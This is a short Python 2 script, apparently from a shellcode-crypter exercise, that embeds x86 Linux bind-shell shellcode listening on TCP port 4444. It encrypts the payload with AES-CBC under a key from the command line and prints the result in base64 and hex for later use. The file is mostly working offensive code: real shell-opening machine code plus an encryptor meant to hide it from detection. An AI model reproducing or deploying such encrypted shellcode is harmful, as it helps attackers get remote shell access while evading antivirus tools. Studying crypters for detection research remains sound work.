#!/usr/bin/env python

import base64, hashlib, os, sys
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

#bind shell tcp localhost p 4444
shellCode=\
"\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x11\\x5c\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

class AESCipher:
    def __init__(self, key):
        #key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()

    def encrypt(self, raw):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))


key = str(sys.argv[1])
cipher = AESCipher(key)
encrypted = cipher.encrypt(shellCode)

hexEncryptedOnlyNum= encrypted.encode('hex')
h = '\\x'.join(hexEncryptedOnlyNum[i:i+2] for i in range(0, len(hexEncryptedOnlyNum), 2))
hexEncrypted ='\\x' + h

print "\nBase64:"
print encrypted 

print "\nHex"
print hexEncrypted + "\n"
print hexEncryptedOnlyNum

